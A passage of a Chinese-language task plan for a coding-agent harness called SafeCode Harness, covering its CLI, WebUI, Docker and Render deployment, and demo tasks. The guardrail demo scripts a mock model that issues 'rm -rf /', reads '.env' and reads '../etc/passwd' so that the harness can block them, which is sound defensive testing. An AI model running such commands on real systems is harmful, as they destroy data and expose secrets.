- 使用 `typer.Typer` 作为主应用和子命令组
- `auth set`：使用 `getpass.getpass("Enter API Key: ")` 隐藏输入；若为空 → error "Key cannot be empty"；调用 `CredentialManager.set_api_key(key)`；打印 "API Key saved successfully"
- `auth status`：调用 `CredentialManager.status()`；打印结果；绝不打印 key
- `auth clear`：调用 `CredentialManager.clear_api_key()`；打印 "API Key cleared"
- **边界情况**：keyring 写入失败 → 错误信息并建议使用环境变量；keyring 读取失败 → 在状态检查中回退到环境变量

### Tests
- **test_cli_auth_set.py**：Mock `CredentialManager`，验证 `set_api_key` 被调用并传入输入；空输入 → error
- **test_cli_auth_status.py**：Mock 返回 `"configured"` → 输出包含 "configured"；Mock 返回 `"missing"` → 输出包含 "missing"
- **test_cli_auth_clear.py**：Mock `CredentialManager`，验证 `clear_api_key` 被调用

### Dependencies
Depends on：Task 6.1（CredentialManager）

Can run in parallel with：Task 7.2

---

### Task 7.2：CLI——Run 命令

### Goal
实现 `safecode run` 和 `safecode demo` 子命令。

### Files
- 创建：`safecode/cli/run.py`
- 创建：`safecode/cli/demo.py`

### Interfaces
- **run**（`run.py`）：
  - `safecode run --workspace <path>`：以真实 LLM 模式运行任务
  - `safecode run --workspace <path> --mock`：以 mock LLM 模式运行任务
  - 选项：`--max-iterations`、`--model`、`--keep-session`、`--timeout`
- **demo**（`demo.py`）：
  - `safecode demo list`：列出可用的 demo 任务
  - `safecode demo run <demo-id>`：以真实 LLM 模式运行 demo
  - `safecode demo run <demo-id> --mock`：以 mock LLM 模式运行 demo

### Implementation Notes
- `run` 命令：
  1. 从工作区的 `task.yaml` 加载 `TaskConfig`
  2. 加载 `RuntimeConfig`（含 CLI 覆盖）
  3. 真实模式检查 API key：若缺失 → 自动提示运行 `safecode auth set`
  4. 创建 `LLMBackend`（真实或 mock）
  5. 创建 `SessionManager` 并运行
  6. 将执行轨迹输出到控制台：每步的 action、工具结果、测试状态、护栏事件
  7. 打印最终 `final_status` 和摘要
- `demo` 命令：
  - Demo 是存储在 `safecode/demos/` 目录中的预打包任务配置
  - `demo list`：扫描 `safecode/demos/` 中的 `task.yaml` 文件，打印 ID、标题、描述
  - `demo run`：加载 demo 配置，与 `run` 命令相同方式运行
- **输出格式**：结构化文本，逐步展示执行过程；使用颜色/格式提高可读性
- **边界情况**：工作区路径不存在 → error；`task.yaml` 未找到 → error；真实模式缺少 API key → 引导用户到 `safecode auth set`

### Tests
- **test_cli_run_mock.py**：使用 `--mock` 标志运行 → 使用 MockLLM，会话完成，输出包含最终状态
- **test_cli_run_no_api_key.py**：真实模式，无 API key → 错误信息引导用户到 `safecode auth set`
- **test_cli_demo_list.py**：`demo list` → 列出可用 demo
- **test_cli_demo_run_mock.py**：`demo run <id> --mock` → 用 MockLLM 运行 demo，输出包含执行轨迹

### Dependencies
Depends on：Task 5.5（SessionManager）、Task 6.4（LLM factory）、Task 7.1

Can run in parallel with：Task 7.3

---

### Task 7.3：WebUI

### Goal
使用 FastAPI + Jinja2 实现轻量级 WebUI，支持选择和运行 demo 任务并观察执行轨迹。

### Files
- 创建：`safecode/webui/__init__.py`
- 创建：`safecode/webui/app.py`
- 创建：`safecode/webui/templates/`
- 创建：`safecode/webui/templates/base.html`
- 创建：`safecode/webui/templates/index.html`
- 创建：`safecode/webui/templates/run.html`
- 创建：`safecode/webui/static/`
- 创建：`safecode/webui/static/style.css`

### Interfaces
- **FastAPI app**（`app.py`）：
  - `GET /`：首页——列出 demo 任务
  - `GET /run/{demo_id}`：运行页面——展示 demo 的执行轨迹
  - `POST /api/run/{demo_id}`：API 端点，启动 demo 运行；接收 `{"mode": "mock"|"real"}`；返回会话结果
  - `GET /api/status/{session_id}`：API 端点，轮询会话状态（用于实时更新）

### Implementation Notes
- **WebUI 为轻量级**：Jinja2 模板 + 原生 HTML/CSS；不使用 React/Vue；无登录、无用户管理、无项目管理
- **首页**：按 `demo_order` 排序列出所有 demo；每个 demo 显示标题、描述、task_type；"Run (Mock)" 和 "Run (Real)" 按钮
- **运行页面**：逐步展示执行轨迹；每步显示：action、工具名、参数摘要、结果摘要、护栏事件（高亮）、测试状态变化；末尾显示最终状态
- **实时更新**：简单轮询（每 1-2 秒）到 `/api/status/{session_id}`；返回当前步骤计数和最新结果
- **会话管理**：会话存储在内存中（dict）；WebUI 会话无持久化存储
- **边界情况**：Demo 未找到 → 404；会话未找到 → 404；真实模式无 API key → UI 中显示错误信息

### Tests
- **test_webui_index.py**：GET `/` → 200，HTML 包含 demo 列表
- **test_webui_run_mock.py**：POST `/api/run/{demo_id}` 带 `mode=mock` → 200，返回含步骤的 session
- **test_webui_run_demo_not_found.py**：POST 到不存在的 demo → 404
- **test_webui_status.py**：GET `/api/status/{session_id}` → 200，返回当前状态

### Dependencies
Depends on：Task 5.5（SessionManager）、Task 7.2（demo 命令逻辑）

Can run in parallel with：Task 7.1、Task 7.2

---

### Task 7.4：CLI Serve 命令

### Goal
实现 `safecode serve` 命令，启动 WebUI 服务器。

### Files
- 创建：`safecode/cli/serve.py`
- 修改：`safecode/cli/main.py`（注册 `serve` 子命令）

### Interfaces
- **serve**（`serve.py`）：
  - `safecode serve`：使用 uvicorn 启动 FastAPI 服务器
  - 选项：`--host`（默认 `0.0.0.0`）、`--port`（默认 `8000`）

### Implementation Notes
- 使用 `uvicorn.run(app, host=host, port=port)`
- 打印启动消息和 URL
- 处理 `KeyboardInterrupt` 以优雅关闭

### Tests
- **test_cli_serve.py**：验证 `serve` 命令使用正确的 host/port 启动 uvicorn；验证 `--host` 和 `--port` 标志生效

### Dependencies
Depends on：Task 7.3

Can run in parallel with：（无）

---

## Phase 8：Demo 任务与部署

### Task 8.1：Demo 任务定义

### Goal
创建三个 demo 任务的 `task.yaml` 文件及其工作区模板，用于机制演示。

### Files
- 创建：`safecode/demos/guardrail_block/task.yaml`
- 创建：`safecode/demos/guardrail_block/src/`（最小化工作区文件）
- 创建：`safecode/demos/fix_bug/task.yaml`
- 创建：`safecode/demos/fix_bug/src/calculator.py`（有 bug 的实现）
- 创建：`safecode/demos/fix_bug/tests/test_calculator.py`（失败的测试）
- 创建：`safecode/demos/complete_function/task.yaml`
- 创建：`safecode/demos/complete_function/src/`（函数骨架）
- 创建：`safecode/demos/complete_function/tests/`（测试）

### Interfaces
- 每个 demo 目录包含一个 `task.yaml` 和工作区文件
- 无代码接口——这是配置/数据

### Implementation Notes
- **Demo 1：`guardrail_block`** — 治理护栏拦截危险动作
  - `task.yaml`：`task_type: fix_bug`、`allowed_tools: [read_file, run_shell]`、`max_iterations: 5`
  - Mock 场景：LLM 依次尝试 `run_shell("rm -rf /")`、`read_file(".env")`、`read_file("../etc/passwd")` → 全部拦截 → `final_status = terminated_by_guardrail`
  - 工作区：最小文件（仅一个 README）
- **Demo 2：`fix_bug`** — 测试反馈闭环驱动行为改变
  - `task.yaml`：`task_type: fix_bug`、`test_command: pytest`、`allowed_tools: [list_files, read_file, edit_file, run_tests]`
  - `src/calculator.py`：`add` 函数返回 `a - b` 而非 `a + b`（bug）
  - `tests/test_calculator.py`：测试 `add`、`subtract`、`multiply`、`divide`；`test_add` 失败
  - Mock 场景：步骤 1 `run_tests` → 失败 → 步骤 2 `edit_file` 修复 → 步骤 3 `run_tests` → 通过 → `final_status = success`
- **Demo 3：`complete_function`** — 护栏 + 反馈闭环协同
  - `task.yaml`：`task_type: complete_function`、`test_command: pytest`、`allowed_tools: [list_files, read_file, write_file, edit_file, run_tests]`
  - `src/`：函数骨架（`pass` 主体）
  - `tests/`：对骨架失败的测试
  - Mock 场景：Agent 读取代码，编写实现，运行测试，获得反馈，修复问题，测试通过 → `final_status = success`；护栏允许所有合法操作
- **Demo 4：`real_llm_fix_bug`**（可选，用于真实 LLM 验证）：与 `fix_bug` 相同的工作区，但配置为真实 LLM 模式

### Tests
- **test_demo_configs.py**：每个 demo 的 `task.yaml` 通过 `TaskConfigLoader` 验证；工作区模板存在；`test_command` 有效
- **test_demo_guardrail_mock.py**（集成）：用 mock LLM 运行 `guardrail_block` demo → `final_status = terminated_by_guardrail`，`blocked_count >= 3`
- **test_demo_fix_bug_mock.py**（集成）：用 mock LLM 运行 `fix_bug` demo → `final_status = success`，测试反馈闭环演示行为改变
- **test_demo_complete_function_mock.py**（集成）：运行 `complete_function` demo → `final_status = success`，护栏和反馈闭环协同工作

### Dependencies
Depends on：Task 5.5（SessionManager）、Task 6.4（LLM factory）、Task 5.3（TaskConfigLoader）

Can run in parallel with：Task 8.2

---

### Task 8.2：Docker 部署

### Goal
完成 Docker 配置，构建并运行完整项目，包括 WebUI 和 demo 任务。

### Files
- 修改：`Dockerfile`（从 Task 0.3）
- 创建：`docker-compose.yml`（可选，便于使用）

### Interfaces
- **Docker 镜像**：`safecode-harness`
- **入口点**：`safecode serve --host 0.0.0.0 --port 8000`（或可配置）
- **端口**：8000

### Implementation Notes
- 从 Task 0.3 扩展 Dockerfile：
  - 复制所有源代码和 demo 目录
  - 使用 `pip install -e .` 安装
  - 默认命令：`safecode serve --host 0.0.0.0 --port 8000`
  - 非 root 用户：`safecode`（或 `app`）
  - 环境变量支持：`SAFECODE_API_KEY`、`SAFECODE_MODEL`、`SAFECODE_BASE_URL`
- **Docker 中的 API Key**：文档说明 key 必须通过 `-e SAFECODE_API_KEY=xxx` 传入（容器中 keyring 通常不可用）
- **镜像大小**：目标 < 500MB；使用 `python:3.10-slim` 基础镜像，移除 pip 缓存

### Tests
- 验证 `docker build -t safecode-harness .` 成功
- 验证 `docker run --rm -p 8000:8000 safecode-harness` 启动 WebUI
- 验证 `curl http://localhost:8000/` 返回 HTML（首页）
- 验证 `docker run --rm safecode-harness safecode run --workspace examples/fix_bug --mock`（或等效命令）运行 mock demo

### Dependencies
Depends on：Task 7.4（serve 命令）、Task 8.1（demo 任务）

Can run in parallel with：（无）

---

### Task 8.3：Render 云部署配置

### Goal
创建 Render 部署配置，用于云可访问的 WebUI。

### Files
- 创建：`render.yaml`（Render Blueprint）
- 创建：`Procfile`（非 Docker 部署的替代方案）

### Interfaces
- **Render 服务**：Web Service 类型，Docker 运行时
- **环境变量**：`SAFECODE_API_KEY`（secret）、`SAFECODE_BASE_URL`、`SAFECODE_MODEL`（可选）
- **健康检查**：`GET /` 返回 200

### Implementation Notes
- Render 自动检测 `Dockerfile` 并构建镜像
- `render.yaml` 为可选（Render 也可通过仪表板配置）
- 在 README 中记录 Render 部署步骤（Phase 9）
- 关键环境变量：`PORT`（Render 自动设置）、`SAFECODE_API_KEY`（在 Render 仪表板中设置为 secret）
- `render.yaml` 中不硬编码 secret

### Tests
- 手动验证：部署到 Render，验证公网 URL 可访问，mock demo 可成功运行

### Dependencies
Depends on：Task 8.2（Docker）

Can run in parallel with：（无）

---

## Phase 9：最终验证与文档

### Task 9.1：全量 Pytest 套件与覆盖率

### Goal
运行完整测试套件，确保所有测试通过，验证核心 harness 模块覆盖率 ≥ 80%。

### Files
- 修改：（需要修复的测试文件）
- 修改：`pyproject.toml`（确保覆盖率配置正确）

### Interfaces
- 无新接口

### Implementation Notes
- 运行 `pytest --cov=safecode --cov-report=term --cov-report=html`
- 目标：所有测试通过，以下模块覆盖率 ≥ 80%：`safecode/core/`、`safecode/guardrail/`、`safecode/feedback/`、`safecode/tools/`、`safecode/llm/`、`safecode/context/`、`safecode/config/`
- 修复任何失败的测试或覆盖率缺口
- 确保 mock LLM 测试覆盖所有停止条件和护栏场景
- 确保无依赖网络的测试泄漏到 mock-only 测试套件中

### Tests
- 本任务本身就是测试验证；无需新增测试

### Dependencies
Depends on：所有前置任务

Can run in parallel with：Task 9.3（文档）

---

### Task 9.2：机制演示脚本

### Goal
创建 SPEC §9.3 和 A.6 中指定的三个机制演示脚本。

### Files
- 创建：`tests/demo/test_guardrail_block.py`（或 `scripts/demo_guardrail.py`）
- 创建：`tests/demo/test_fix_bug_feedback.py`（或 `scripts/demo_fix_bug.py`）
- 创建：`tests/demo/test_complete_function.py`（或 `scripts/demo_complete_function.py`）

### Interfaces
- 每个 demo 脚本是一个自包含的测试或脚本，在 mock LLM 模式下运行
- 使用 `SessionManager` 和 `MockLLM` 确定性复现指定行为

### Implementation Notes
- **Demo 1 — Guardrail Block**：Scripted mock LLM 返回危险动作（rm -rf、read .env、read ../etc/passwd）→ 全部拦截 → `final_status = terminated_by_guardrail`；验证 `blocked_count >= 3` 且每个 `GuardrailEvent` 具有正确的 `reason`
- **Demo 2 — Fix Bug Feedback Loop**：Scripted mock LLM：步骤 1 `run_tests` → 失败，步骤 2 `edit_file` 修复，步骤 3 `run_tests` → 通过 → `final_status = success`；验证 `TestFeedback` 显示 `fixed_tests` 和 `progress_summary`
- **Demo 3 — Complete Function（协同）**：Scripted mock LLM：护栏允许合法操作，反馈闭环驱动迭代 → `final_status = success`；验证护栏事件（无拦截）和反馈进展

### Tests
- 每个 demo 脚本本身就是一个测试；运行 `pytest tests/demo/` 必须全部通过

### Dependencies
Depends on：Task 8.1（demo 任务）、Task 5.5（SessionManager）

Can run in parallel with：Task 9.3

---

### Task 9.3：README 与文档

### Goal
编写完整的 `README.md`，覆盖所有必需章节：项目概述、安装、使用、分发、安全、架构。

### Files
- 修改：`README.md`（替换模板内容）

### Interfaces
- 无代码接口

### Implementation Notes
- 必须包含以下章节：
  1. **项目标题与描述**：什么是 SafeCode Harness
  2. **安装**：`git clone`、`pip install -e .`、前置条件
  3. **使用**：CLI 命令（`safecode run`、`safecode demo`、`safecode auth`、`safecode serve`）
  4. **API Key 配置**：`safecode auth set`、环境变量、Docker
  5. **分发**：Docker 构建和运行命令；Render 部署；已知限制
  6. **架构**：模块图、管道示意图、组件描述
  7. **安全**：威胁模型、密钥存储、护栏机制、安全边界声明
  8. **开发**：运行测试、覆盖率、CI
  9. **目录结构**：关键目录和文件概述
  10. **Demo**：Demo 任务列表及其演示内容
  11. **许可证与作者**

### Tests
- 对照 SPEC 要求审查 README 完整性；验证所有命令准确无误

### Dependencies
Depends on：所有前置任务

Can run in parallel with：Task 9.1、Task 9.2

---

### Task 9.4：CI 验证与 AGENT_LOG 更新

### Goal
确保 GitLab CI 通过，更新 `AGENT_LOG.md` 记录最终实现笔记，验证所有交付产物齐全。

### Files
- 修改：`.gitlab-ci.yml`（如需修复）
- 修改：`AGENT_LOG.md`
- 验证：`REFLECTION.md`（存在，将由学生撰写）

### Interfaces
- 无新接口

### Implementation Notes
- 推送最新代码到 GitLab；验证 CI pipeline 为绿色
- 更新 `AGENT_LOG.md`，添加总结实现的最终条目
- 验证所有交付产物齐全：
  - `SPEC.md` ✓
  - `PLAN.md` ✓
  - `SPEC_PROCESS.md` ✓
  - `AGENT_LOG.md` ✓
  - `REFLECTION.md` ✓（学生撰写）
  - `README.md` ✓
  - `.gitlab-ci.yml` ✓
  - `Dockerfile` ✓
  - 源代码及测试 ✓
  - Demo 脚本 ✓
- 验证 git 历史中无 API Key（`git log -p | grep -i api_key`）

### Tests
- GitLab CI 在最终 push 上必须为绿色
- git 历史中无 secret

### Dependencies
Depends on：所有前置任务

Can run in parallel with：（无——最终验证）

---

## 任务依赖图

```
Phase 0：
  0.1（项目脚手架）
  ├── 0.2（GitLab CI）[与 0.3 并行]
  └── 0.3（Docker 基础）[与 0.2 并行]

Phase 1：
  0.1 → 1.1（数据模型）
        ├── 1.2（LLM 接口）[与 1.3、1.4、1.5 并行]
        ├── 1.3（Action Parser）[与 1.2、1.4、1.5 并行]
        ├── 1.4（Stop Controller）[与 1.2、1.3、1.5 并行]
        └── 1.5（Workspace Manager）[与 1.2、1.3、1.4 并行]
  1.1 + 1.2 + 1.3 + 1.4 + 1.5 → 1.6（Agent Loop）

Phase 2：
  1.1 → 2.1（Tool 基类 + Dispatcher）
        ├── 2.2（list_files、read_file、search_content）[与 2.3、2.4、2.5 并行]
        ├── 2.3（write_file、edit_file）[与 2.2、2.4、2.5 并行]
        ├── 2.4（run_tests）[与 2.2、2.3、2.5 并行]
        └── 2.5（run_shell）[与 2.2、2.3、2.4 并行]
  2.1 + 2.2 + 2.3 + 2.4 + 2.5 → 2.6（Tool Registry）

Phase 3：
  1.1 → 3.1（Path Guard）[与 3.2、3.3 并行]
        ├── 3.2（Sensitive File Guard）[与 3.1、3.3 并行]
        └── 3.3（Shell Guard）[与 3.1、3.2 并行]
  3.1 + 3.2 + 3.3 → 3.4（Guardrail 编排器）
  3.4 + 1.6 → 3.5（Guardrail + Agent Loop 集成）

Phase 4：
  1.1 → 4.1（Test Feedback Summarizer）
  4.1 + 1.6 + 2.4 + 2.6 → 4.2（Feedback + Agent Loop 集成）

Phase 5：
  1.1 → 5.1（Context Builder）[与 5.2、5.3 并行]
        ├── 5.2（Memory Manager）[与 5.1、5.3 并行]
        └── 5.3（Task Config Loader）[与 5.1、5.2 并行]
  1.1 + 5.3 → 5.4（Configuration Manager）
  1.5 + 1.6 + 3.5 + 4.2 + 5.1 + 5.2 + 5.3 + 5.4 + 2.6 → 5.5（Session Manager）

Phase 6：
  6.1（Credential Manager）→ 6.2（RealLLM）
  1.1 + 1.2 → 6.3（MockLLM）[与 6.2 并行]
  6.2 + 6.3 → 6.4（LLM Factory）

Phase 7：
  6.1 → 7.1（CLI Auth）[与 7.2、7.3 并行]
  5.5 + 6.4 + 7.1 → 7.2（CLI Run）[与 7.3 并行]
  5.5 + 7.2 → 7.3（WebUI）[与 7.1、7.2 并行]
  7.3 → 7.4（CLI Serve）

Phase 8：
  5.5 + 6.4 + 5.3 → 8.1（Demo 任务）
  7.4 + 8.1 → 8.2（Docker 部署）
  8.2 → 8.3（Render 配置）

Phase 9：
  全部 → 9.1（全量测试套件）[与 9.3 并行]
  全部 → 9.2（Demo 脚本）[与 9.3 并行]
  全部 → 9.3（README）[与 9.1、9.2 并行]
  全部 → 9.4（CI 验证 + AGENT_LOG）
```

---

## 关键并行化机会

1. **Phase 0**：0.2（CI）和 0.3（Docker）可在 0.1 之后并行
2. **Phase 1**：1.2、1.3、1.4、1.5 可在 1.1 之后全部并行
3. **Phase 2**：2.2、2.3、2.4、2.5 可在 2.1 之后全部并行
4. **Phase 3**：3.1、3.2、3.3 可在 1.1 之后全部并行
5. **Phase 5**：5.1、5.2、5.3 可在 1.1 之后并行
6. **Phase 6**：6.2 和 6.3 可并行（6.3 仅需 1.1+1.2；6.2 还需 6.1）
7. **Phase 7**：7.1、7.2、7.3 可并行（存在部分交叉依赖）
8. **Phase 9**：9.1、9.2、9.3 可并行